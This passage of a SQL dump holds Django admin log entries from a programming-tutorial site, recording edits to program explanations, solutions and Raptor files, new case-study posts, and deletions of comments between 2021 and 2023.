\"explanation\"]}}]',7,2),(1089,'2021-10-11 01:33:39.244885','1036','Program object (1036)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1090,'2021-10-11 01:57:14.418593','1037','Program object (1037)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1091,'2021-10-11 02:22:45.527886','1038','Program object (1038)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1092,'2021-10-11 02:26:17.965346','1039','Program object (1039)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1093,'2021-10-11 05:45:59.252859','1040','Program object (1040)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1094,'2021-10-12 00:59:31.832778','1040','Program object (1040)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1095,'2021-10-12 01:00:57.986017','1040','Program object (1040)',2,'[]',7,2),(1096,'2021-10-12 01:04:29.989912','1041','Program object (1041)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1097,'2021-10-12 01:08:58.762738','1042','Program object (1042)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1098,'2021-10-12 01:20:48.106300','1043','Program object (1043)',2,'[{\"changed\": {\"fields\": [\"solution_path\", \"explanation\"]}}]',7,2),(1099,'2021-10-12 01:22:23.276529','1043','Program object (1043)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1100,'2021-10-12 01:25:02.044624','1043','Program object (1043)',2,'[]',7,2),(1101,'2021-10-12 01:26:58.243237','1043','Program object (1043)',2,'[{\"changed\": {\"fields\": [\"solution\", \"solution_path\"]}}]',7,2),(1102,'2021-10-12 01:41:03.658543','1044','Program object (1044)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1103,'2021-10-12 01:55:41.776299','1045','Program object (1045)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1104,'2021-10-12 05:21:20.818139','1046','Program object (1046)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1105,'2021-10-12 05:22:18.468902','1046','Program object (1046)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1106,'2021-10-12 05:22:33.948112','1046','Program object (1046)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1107,'2021-10-12 05:34:05.794803','1047','Program object (1047)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1108,'2021-10-12 05:34:39.606156','1047','Program object (1047)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1109,'2021-10-12 05:36:39.053523','1048','Program object (1048)',2,'[{\"changed\": {\"fields\": [\"program_title\", \"program_description\", \"explanation\"]}}]',7,2),(1110,'2021-10-12 05:43:19.329891','778','Program object (778)',2,'[{\"changed\": {\"fields\": [\"raptor_file\"]}}]',7,2),(1111,'2021-10-12 06:26:31.525874','1049','Program object (1049)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1112,'2021-10-12 06:27:06.107868','1049','Program object (1049)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1113,'2021-10-12 06:46:00.933861','1050','Program object (1050)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1114,'2021-10-12 06:49:02.999291','1050','Program object (1050)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1115,'2021-10-12 06:49:18.818993','1050','Program object (1050)',2,'[]',7,2),(1116,'2021-10-12 06:52:54.126466','1051','Program object (1051)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1117,'2021-10-12 06:54:59.240099','1052','Program object (1052)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1118,'2021-10-12 06:55:38.760466','1053','Program object (1053)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1119,'2021-10-12 06:56:01.251467','1054','Program object (1054)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1120,'2021-10-14 01:25:05.086569','29','Strings',1,'[{\"added\": {}}]',12,2),(1121,'2021-10-14 01:57:52.707624','1074','Program object (1074)',1,'[{\"added\": {}}]',7,2),(1122,'2021-10-14 02:54:49.261037','1102','Program object (1102)',2,'[{\"changed\": {\"fields\": [\"program_title\", \"slug\", \"program_description\"]}}]',7,2),(1123,'2021-10-18 05:24:18.652195','1079','Program object (1079)',2,'[{\"changed\": {\"fields\": [\"program_description\", \"explanation\"]}}]',7,2),(1124,'2021-10-18 05:24:35.638572','1079','Program object (1079)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1125,'2021-10-18 05:32:26.169103','1110','Program object (1110)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1126,'2021-10-18 05:32:41.741738','1109','Program object (1109)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1127,'2021-10-18 05:34:13.602451','1108','Program object (1108)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1128,'2021-10-18 05:35:42.549589','1107','Program object (1107)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1129,'2021-10-18 05:36:03.913402','1106','Program object (1106)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1130,'2021-10-18 05:36:59.454836','1105','Program object (1105)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1131,'2021-10-18 05:37:29.995129','1104','Program object (1104)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1132,'2021-10-18 05:37:51.764527','1104','Program object (1104)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1133,'2021-10-18 05:38:17.443400','1103','Program object (1103)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1134,'2021-10-18 05:38:36.528889','1102','Program object (1102)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1135,'2021-10-18 05:39:16.891762','1101','Program object (1101)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1136,'2021-10-18 05:39:46.036001','1100','Program object (1100)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1137,'2021-10-18 05:42:59.287459','1099','Program object (1099)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1138,'2021-10-18 05:43:30.702861','1098','Program object (1098)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1139,'2021-10-18 05:44:06.618849','1097','Program object (1097)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1140,'2021-10-18 05:44:29.536426','1096','Program object (1096)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1141,'2021-10-18 05:45:43.206335','1095','Program object (1095)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1142,'2021-10-18 05:45:59.346368','1094','Program object (1094)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1143,'2021-10-18 05:46:18.933358','1093','Program object (1093)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1144,'2021-10-18 05:46:51.792760','1092','Program object (1092)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1145,'2021-10-18 05:47:14.398630','1091','Program object (1091)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1146,'2021-10-18 05:47:20.010256','1090','Program object (1090)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1147,'2021-10-18 05:47:31.793189','1089','Program object (1089)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1148,'2021-10-18 05:48:18.582195','1088','Program object (1088)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1149,'2021-10-18 05:48:35.989731','1087','Program object (1087)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1150,'2021-10-18 05:48:46.545845','1086','Program object (1086)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1151,'2021-10-18 05:48:58.087739','1085','Program object (1085)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1152,'2021-10-18 05:49:12.290866','1084','Program object (1084)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1153,'2021-10-18 05:49:34.485455','1083','Program object (1083)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1154,'2021-10-18 05:49:46.888552','1082','Program object (1082)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1155,'2021-10-18 05:50:01.274765','1081','Program object (1081)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1156,'2021-10-18 05:50:10.603782','1080','Program object (1080)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1157,'2021-10-18 05:50:23.243175','1079','Program object (1079)',2,'[]',7,2),(1158,'2021-10-18 05:51:11.291459','1078','Program object (1078)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1159,'2021-10-18 05:51:29.543427','1076','Program object (1076)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1160,'2021-10-18 05:51:35.555775','1075','Program object (1075)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1161,'2021-10-18 05:51:40.931269','1074','Program object (1074)',2,'[]',7,2),(1162,'2021-10-19 11:49:00.163907','1111','Program object (1111)',1,'[{\"added\": {}}]',7,2),(1163,'2021-10-19 12:04:15.014532','1112','Program object (1112)',1,'[{\"added\": {}}]',7,2),(1164,'2021-10-19 12:06:12.783083','1111','Program object (1111)',2,'[{\"changed\": {\"fields\": [\"solution\"]}}]',7,2),(1165,'2021-10-19 12:06:29.097707','1112','Program object (1112)',2,'[{\"changed\": {\"fields\": [\"solution\"]}}]',7,2),(1166,'2021-10-19 12:07:41.643828','1113','Program object (1113)',1,'[{\"added\": {}}]',7,2),(1167,'2021-10-19 12:17:51.264931','1114','Program object (1114)',1,'[{\"added\": {}}]',7,2),(1168,'2021-10-19 12:31:03.608444','1115','Program object (1115)',1,'[{\"added\": {}}]',7,2),(1169,'2021-10-19 12:32:44.449609','1115','Program object (1115)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1170,'2021-10-19 12:34:30.720414','1115','Program object (1115)',2,'[{\"changed\": {\"fields\": [\"solution\"]}}]',7,2),(1171,'2021-10-19 12:47:55.522805','1116','Program object (1116)',1,'[{\"added\": {}}]',7,2),(1172,'2021-10-19 12:48:31.673417','1116','Program object (1116)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1173,'2021-10-21 02:07:37.531656','1117','Program object (1117)',1,'[{\"added\": {}}]',7,2),(1174,'2021-10-21 02:12:42.912277','985','Program object (985)',2,'[{\"changed\": {\"fields\": [\"output_file\"]}}]',7,2),(1175,'2021-10-21 02:30:46.647666','987','Program object (987)',2,'[{\"changed\": {\"fields\": [\"output_file\"]}}]',7,2),(1176,'2021-10-21 02:31:49.063458','986','Program object (986)',2,'[{\"changed\": {\"fields\": [\"output_file\"]}}]',7,2),(1177,'2021-10-21 02:32:08.149352','987','Program object (987)',2,'[]',7,2),(1178,'2021-10-21 02:41:42.563293','21','Language Basics',2,'[{\"changed\": {\"fields\": [\"featured_image\"]}}]',12,2),(1179,'2021-10-22 01:55:35.995754','30','Scenario Based Problems in Python',1,'[{\"added\": {}}]',12,2),(1180,'2021-10-22 02:08:37.526832','1118','Program object (1118)',1,'[{\"added\": {}}]',7,2),(1181,'2021-10-22 02:14:25.806808','1118','Program object (1118)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1182,'2021-10-22 02:15:35.896881','1118','Program object (1118)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1183,'2021-10-22 16:28:16.919399','1118','Program object (1118)',2,'[{\"changed\": {\"fields\": [\"program_description\", \"solution\"]}}]',7,2),(1184,'2021-10-22 16:29:02.138393','1118','Program object (1118)',2,'[{\"changed\": {\"fields\": [\"solution\"]}}]',7,2),(1185,'2021-10-22 16:30:05.025147','1118','Program object (1118)',2,'[{\"changed\": {\"fields\": [\"solution\"]}}]',7,2),(1186,'2021-10-23 02:03:54.713350','1118','Program object (1118)',2,'[{\"changed\": {\"fields\": [\"solution\", \"explanation\"]}}]',7,2),(1187,'2021-10-23 02:38:46.291436','1118','Program object (1118)',2,'[{\"changed\": {\"fields\": [\"solution\"]}}]',7,2),(1188,'2021-10-23 09:16:59.073496','1118','Program object (1118)',2,'[{\"changed\": {\"fields\": [\"solution\", \"explanation\"]}}]',7,2),(1189,'2021-10-29 03:53:05.967711','1119','Program object (1119)',1,'[{\"added\": {}}]',7,2),(1190,'2021-10-29 04:41:32.033823','1120','Program object (1120)',1,'[{\"added\": {}}]',7,2),(1191,'2021-10-29 04:48:42.229666','1121','Program object (1121)',1,'[{\"added\": {}}]',7,2),(1192,'2021-10-29 04:51:17.475167','1121','Program object (1121)',2,'[{\"changed\": {\"fields\": [\"Program title\"]}}]',7,2),(1193,'2021-10-29 05:11:57.759956','1122','Program object (1122)',1,'[{\"added\": {}}]',7,2),(1194,'2021-10-29 05:38:13.204044','1123','Program object (1123)',1,'[{\"added\": {}}]',7,2),(1195,'2021-10-29 05:49:57.039924','1123','Program object (1123)',2,'[{\"changed\": {\"fields\": [\"Explanation\"]}}]',7,2),(1196,'2021-10-29 05:52:13.864135','1123','Program object (1123)',2,'[{\"changed\": {\"fields\": [\"Explanation\"]}}]',7,2),(1197,'2021-10-29 06:14:30.588277','1123','Program object (1123)',2,'[{\"changed\": {\"fields\": [\"Explanation\"]}}]',7,2),(1198,'2021-10-29 06:28:12.484703','1124','Program object (1124)',1,'[{\"added\": {}}]',7,2),(1199,'2021-10-29 06:44:43.533586','22','Operators',2,'[{\"changed\": {\"fields\": [\"Featured image\"]}}]',12,2),(1200,'2021-10-29 06:51:37.305741','1124','Program object (1124)',2,'[{\"changed\": {\"fields\": [\"Chapter\"]}}]',7,2),(1201,'2021-10-29 10:00:30.061284','842','Program object (842)',2,'[{\"changed\": {\"fields\": [\"Raptor file\", \"Output file\"]}}]',7,2),(1202,'2021-10-29 10:01:15.061791','841','Program object (841)',2,'[{\"changed\": {\"fields\": [\"Raptor file\", \"Output file\"]}}]',7,2),(1203,'2021-10-29 10:02:31.484639','840','Program object (840)',2,'[{\"changed\": {\"fields\": [\"Raptor file\", \"Output file\"]}}]',7,2),(1204,'2021-10-29 10:03:16.729599','839','Program object (839)',2,'[{\"changed\": {\"fields\": [\"Raptor file\", \"Output file\"]}}]',7,2),(1205,'2021-10-29 10:07:17.998235','1061','Program object (1061)',2,'[{\"changed\": {\"fields\": [\"Raptor file\", \"Output file\"]}}]',7,2),(1206,'2021-10-29 10:07:41.696467','1062','Program object (1062)',2,'[{\"changed\": {\"fields\": [\"Raptor file\", \"Output file\"]}}]',7,2),(1207,'2021-10-29 10:08:21.480589','1060','Program object (1060)',2,'[{\"changed\": {\"fields\": [\"Raptor file\", \"Output file\"]}}]',7,2),(1208,'2021-10-30 09:23:33.805537','1021','Program object (1021)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1209,'2021-10-30 09:23:39.789235','917','Program object (917)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1210,'2021-10-30 09:23:48.763185','105','Program object (105)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1211,'2021-10-30 09:26:43.608617','1097','Program object (1097)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1212,'2021-10-30 09:26:51.711598','778','Program object (778)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1213,'2021-10-30 09:27:24.791940','995','Program object (995)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1214,'2021-10-30 09:27:41.450035','883','Program object (883)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1215,'2021-10-30 09:27:50.531743','74','Program object (74)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1216,'2021-10-30 09:28:36.257660','896','Program object (896)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1217,'2021-10-30 09:28:40.293283','1006','Program object (1006)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1218,'2021-10-30 09:28:52.027115','85','Program object (85)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1219,'2021-10-30 09:28:52.977041','85','Program object (85)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1220,'2021-10-30 09:29:29.653711','1004','Program object (1004)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1221,'2021-10-30 09:29:40.494892','83','Program object (83)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1222,'2021-10-30 09:29:48.120474','894','Program object (894)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1223,'2021-10-30 09:30:16.187406','1005','Program object (1005)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1224,'2021-10-30 09:30:24.559528','895','Program object (895)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1225,'2021-10-30 09:30:33.868891','84','Program object (84)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1226,'2021-10-30 09:31:46.782413','1048','Program object (1048)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1227,'2021-10-30 09:31:53.623555','950','Program object (950)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1228,'2021-10-30 09:32:04.432716','770','Program object (770)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1229,'2021-10-30 09:35:46.067756','100','Program object (100)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1230,'2021-10-30 09:35:57.248429','1016','Program object (1016)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1231,'2021-10-30 09:36:06.381181','1016','Program object (1016)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1232,'2021-10-30 09:36:37.669354','897','Program object (897)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1233,'2021-10-30 09:59:27.227389','75','Program object (75)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1234,'2021-10-30 09:59:37.321215','996','Program object (996)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1235,'2021-10-30 09:59:45.929250','884','Program object (884)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1236,'2021-10-30 10:01:09.858447','1083','Program object (1083)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1237,'2021-10-30 10:01:21.993367','114','Program object (114)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1238,'2021-10-30 10:01:53.075389','1007','Program object (1007)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1239,'2021-10-30 10:02:52.817894','86','Program object (86)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1240,'2021-10-30 10:03:41.495155','998','Program object (998)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1241,'2021-10-30 10:03:50.419313','77','Program object (77)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1242,'2021-10-30 10:03:58.948870','886','Program object (886)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1243,'2021-10-30 10:04:09.740916','887','Program object (887)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1244,'2021-10-30 10:04:44.405106','1110','Program object (1110)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1245,'2021-10-30 10:04:59.189818','898','Program object (898)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1246,'2021-10-30 10:05:08.454766','87','Program object (87)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1247,'2021-10-30 10:06:13.274532','898','Program object (898)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1248,'2021-10-30 10:06:50.028535','889','Program object (889)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1249,'2021-10-30 10:06:58.805264','882','Program object (882)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1250,'2021-10-30 10:07:05.960272','756','Program object (756)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1251,'2021-10-30 10:09:37.972492','1070','Program object (1070)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1252,'2021-10-30 10:09:47.155102','823','Program object (823)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1253,'2021-10-30 10:10:06.031371','947','Program object (947)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1254,'2021-10-30 10:10:29.071725','832','Program object (832)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1255,'2021-10-30 10:10:29.139227','832','Program object (832)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1256,'2021-10-30 10:11:31.267565','1027','Program object (1027)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1257,'2021-10-30 10:11:40.195035','924','Program object (924)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1258,'2021-10-30 10:11:51.162658','112','Program object (112)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1259,'2021-10-30 10:12:44.340223','1017','Program object (1017)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1260,'2021-10-30 10:13:13.923398','914','Program object (914)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1261,'2021-10-30 10:13:22.039782','101','Program object (101)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1262,'2021-10-30 10:15:22.225054','743','Program object (743)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1263,'2021-10-30 10:15:51.416002','1036','Program object (1036)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1264,'2021-10-30 10:16:06.023509','930','Program object (930)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1265,'2021-10-30 10:17:23.952178','1019','Program object (1019)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1266,'2021-10-30 10:17:34.051384','916','Program object (916)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1267,'2021-10-30 10:17:44.720989','103','Program object (103)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1268,'2021-10-30 10:22:45.697021','831','Program object (831)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1269,'2021-10-30 10:24:28.126681','899','Program object (899)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1270,'2021-10-30 10:24:41.642439','1008','Program object (1008)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1271,'2021-10-30 10:25:16.861898','88','Program object (88)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1272,'2021-10-30 10:30:51.133693','1001','Program object (1001)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1273,'2021-10-30 10:32:10.651218','79','Program object (79)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1274,'2021-10-30 10:32:18.463091','890','Program object (890)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1275,'2021-10-30 10:33:18.051465','1028','Program object (1028)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1276,'2021-10-30 10:33:28.856678','113','Program object (113)',2,'[{\"changed\": {\"fields\": [\"Raptor file\"]}}]',7,2),(1277,'2021-12-24 01:26:07.449695','96','Program object (96)',2,'[{\"changed\": {\"fields\": [\"Program title\"]}}]',7,2),(1278,'2022-07-26 17:18:54.643250','1','Comment_Program object (1)',3,'',24,2),(1279,'2022-07-27 04:28:24.839452','3','OOPS in Java',1,'[{\"added\": {}}]',10,2),(1280,'2022-07-27 04:29:11.076009','4','Database Management',1,'[{\"added\": {}}]',10,2),(1281,'2022-07-27 04:30:07.072459','5','Web Prograaming',1,'[{\"added\": {}}]',10,2),(1282,'2022-07-27 06:03:22.593125','3','OOPS CASE STUDY 1',1,'[{\"added\": {}}]',9,2),(1283,'2022-07-27 06:58:06.016294','4','OOPS CASE STUDY 2',1,'[{\"added\": {}}]',9,2),(1284,'2022-07-27 07:11:57.203642','5','DBMS CASE STUDY 1',1,'[{\"added\": {}}]',9,2),(1285,'2022-07-27 07:23:18.243874','6','IP CASE STUDY 1',1,'[{\"added\": {}}]',9,2),(1286,'2022-07-27 10:20:18.093420','3','C Programming',2,'[{\"changed\": {\"fields\": [\"Author\"]}}]',8,2),(1287,'2022-07-27 10:20:47.995237','4','Logic Building in C',2,'[{\"changed\": {\"fields\": [\"Author\"]}}]',8,2),(1288,'2022-07-27 10:21:32.638544','5','Python Programming',2,'[{\"changed\": {\"fields\": [\"Author\"]}}]',8,2),(1289,'2022-07-27 10:21:49.817961','7','Python Logic Building',2,'[{\"changed\": {\"fields\": [\"Author\"]}}]',8,2),(1290,'2022-07-27 10:22:29.241085','6','Java Programming',2,'[{\"changed\": {\"fields\": [\"Author\"]}}]',8,2),(1291,'2022-07-27 10:22:52.948500','1','Text Mining',2,'[{\"changed\": {\"fields\": [\"Author\"]}}]',10,2),(1292,'2022-07-27 10:23:03.747057','2','Python Tutorial',2,'[{\"changed\": {\"fields\": [\"Author\"]}}]',10,2),(1293,'2022-07-27 10:23:12.717605','3','OOPS in Java',2,'[]',10,2),(1294,'2022-07-27 10:23:17.584236','5','Web Prograaming',2,'[]',10,2),(1295,'2022-07-27 10:39:09.694478','6','IP CASE STUDY 1',2,'[{\"changed\": {\"fields\": [\"Posted on\"]}}]',9,2),(1296,'2022-07-27 10:40:12.728758','5','DBMS CASE STUDY 1',2,'[{\"changed\": {\"fields\": [\"Posted on\"]}}]',9,2),(1297,'2022-07-27 10:40:40.782905','4','OOPS CASE STUDY 2',2,'[{\"changed\": {\"fields\": [\"Posted on\"]}}]',9,2),(1298,'2022-07-27 10:41:13.625164','3','OOPS CASE STUDY 1',2,'[{\"changed\": {\"fields\": [\"Posted on\"]}}]',9,2),(1299,'2022-07-27 10:45:22.796090','5','DBMS CASE STUDY 1',2,'[{\"changed\": {\"fields\": [\"Post body\"]}}]',9,2),(1300,'2022-07-27 10:46:14.939738','7','DBMS Case Study 2',1,'[{\"added\": {}}]',9,2),(1301,'2022-07-28 03:52:06.439758','6','OS Case Study',1,'[{\"added\": {}}]',10,2),(1302,'2022-07-28 04:27:07.793206','6','OS Case Study',2,'[{\"changed\": {\"fields\": [\"Author\"]}}]',10,2),(1303,'2022-07-28 08:44:37.800241','6','Operating Systems',2,'[{\"changed\": {\"fields\": [\"Blog name\"]}}]',10,2),(1304,'2022-07-28 12:04:49.110961','9','Comment object (9)',3,'',11,2),(1305,'2022-07-28 12:04:49.114182','8','Comment object (8)',3,'',11,2),(1306,'2022-07-28 12:29:11.870017','8','Dead Lock Identification',1,'[{\"added\": {}}]',9,2),(1307,'2022-07-28 12:32:12.617153','9','Scheduling Algorithm case Study',1,'[{\"added\": {}}]',9,2),(1308,'2022-07-28 12:36:10.730536','10','Semaphore for Process Synchornization',1,'[{\"added\": {}}]',9,2),(1309,'2022-07-29 05:15:34.194864','68','Comment_Program object (68)',3,'',24,2),(1310,'2022-07-29 05:15:34.197654','66','Comment_Program object (66)',3,'',24,2),(1311,'2022-07-29 05:16:35.315123','39','Comment_Program object (39)',3,'',24,2),(1312,'2022-07-29 05:16:51.305000','24','Comment_Program object (24)',3,'',24,2),(1313,'2023-02-06 15:26:59.724797','16859','Comment_Program object (16859)',3,'',24,2),(1314,'2023-02-06 15:26:59.727548','16858','Comment_Program object (16858)',3,'',24,2),(1315,'2023-02-06 15:26:59.729339','16857','Comment_Program object (16857)',3,'',24,2),(1316,'2023-02-06 15:26:59.730844','16856','Comment_Program object (16856)',3,'',24,2),(1317,'2023-02-06 15:26:59.732333','16855','Comment_Program object (16855)',3,'',24,2),(1318,'2023-02-06 15:26:59.734787','16854','Comment_Program object (16854)',3,'',24,2),(1319,'2023-02-06 15:26:59.736197','16853','Comment_Program object (16853)',3,'',24,2),(1320,'2023-02-06 15:26:59.737422','16852','Comment_Program object (16852)',3,'',24,2),(1321,'2023-02-06 15:26:59.738593','16851','Comment_Program object (16851)',3,'',24,2),(1322,'2023-02-06 15:26:59.739795','16850','Comment_Program object (16850)',3,'',24,2),(1323,'2023-02-06 15:26:59.741079','16849','Comment_Program object (16849)',3,'',24,2),(1324,'2023-02-06 15:26:59.742335','16848','Comment_Program object (16848)',3,'',24,2),(1325,'2023-02-06 15:26:59.743774','16847','Comment_Program object (16847)',3,'',24,2),(1326,'2023-02-06 15:26:59.745342','16846','Comment_Program object (16846)',3,'',24,2),(1327,'2023-02-06 15:26:59.747092','16845','Comment_Program object 